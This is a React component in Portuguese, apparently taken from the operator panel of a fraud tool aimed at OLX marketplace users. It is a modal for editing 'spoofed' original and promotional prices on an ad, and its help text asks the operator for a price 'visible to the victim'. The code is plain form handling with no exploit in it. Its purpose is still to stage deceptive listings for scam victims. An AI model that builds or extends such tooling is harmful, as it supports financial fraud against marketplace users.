import { useEffect, useState } from 'react';
import type { OlxOperatorAdSpoofRow } from '../../api/olx/types';

type UpdateSpoofModalProps = {
  open: boolean;
  busy: boolean;
  row: OlxOperatorAdSpoofRow | null;
  onClose: () => void;
  onSubmit: (originalPrice: number | null, promotionalPrice: number | null) => void;
};

function toInput(value?: number | null): string {
  if (value === null || value === undefined) return '';
  return String(value);
}

export function UpdateSpoofModal({
  open,
  busy,
  row,
  onClose,
  onSubmit,
}: UpdateSpoofModalProps) {
  const [originalPrice, setOriginalPrice] = useState('');
  const [promotionalPrice, setPromotionalPrice] = useState('');

  useEffect(() => {
    if (!open || !row) {
      setOriginalPrice('');
      setPromotionalPrice('');
      return;
    }
    setOriginalPrice(toInput(row.originalPrice));
    setPromotionalPrice(toInput(row.promotionalPrice));
  }, [open, row]);

  if (!open || !row) return null;

  function parsePrice(raw: string): number | null {
    const trimmed = raw.trim();
    if (!trimmed) return null;
    const normalized = trimmed.replace(',', '.');
    const value = Number(normalized);
    return Number.isFinite(value) ? value : null;
  }

  function handleSubmit() {
    const original = parsePrice(originalPrice);
    const promotional = parsePrice(promotionalPrice);
    if (original === null && promotional === null) return;
    onSubmit(original, promotional);
  }

  const hasPrice = parsePrice(originalPrice) !== null || parsePrice(promotionalPrice) !== null;

  return (
    <div className="dialog-backdrop dialog-backdrop--modal" onClick={onClose}>
      <div className="dialog-card olx-modal" onClick={(e) => e.stopPropagation()}>
        <div className="modal-stack-header">
          <div>
            <h3>Editar preços spoofados</h3>
            <p className="muted small">
              Anúncio <strong>{row.adId}</strong> — informe ao menos um preço visível para a vítima.
            </p>
          </div>
          <button type="button" className="account-picker-close" onClick={onClose} aria-label="Fechar">
            <span aria-hidden="true">×</span>
          </button>
        </div>

        <div className="form-grid">
          <div className="field">
            <label htmlFor="spoofOriginalPrice">Preço original (R$)</label>
            <input
              id="spoofOriginalPrice"
              className="nexus-input"
              inputMode="decimal"
              value={originalPrice}
              onChange={(e) => setOriginalPrice(e.target.value)}
              placeholder="Ex.: 1999.90"
            />
          </div>
          <div className="field">
            <label htmlFor="spoofPromoPrice">Preço promocional (R$)</label>
            <input
              id="spoofPromoPrice"
              className="nexus-input"
              inputMode="decimal"
              value={promotionalPrice}
              onChange={(e) => setPromotionalPrice(e.target.value)}
              placeholder="Ex.: 1499.90"
            />
          </div>
        </div>

        <div className="dialog-actions">
          <button type="button" className="btn btn-ghost" onClick={onClose} disabled={busy}>
            Cancelar
          </button>
          <button
            type="button"
            className="btn btn-primary"
            disabled={busy || !hasPrice}
            onClick={handleSubmit}
          >
            {busy ? 'Salvando…' : 'Salvar preços'}
          </button>
        </div>
      </div>
    </div>
  );
}
